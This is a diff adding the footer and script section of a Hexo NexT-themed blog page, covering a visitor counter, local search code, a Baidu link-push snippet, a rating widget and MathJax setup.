+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+  
+
+
+  
+
+  
+
+</body>
+</html>
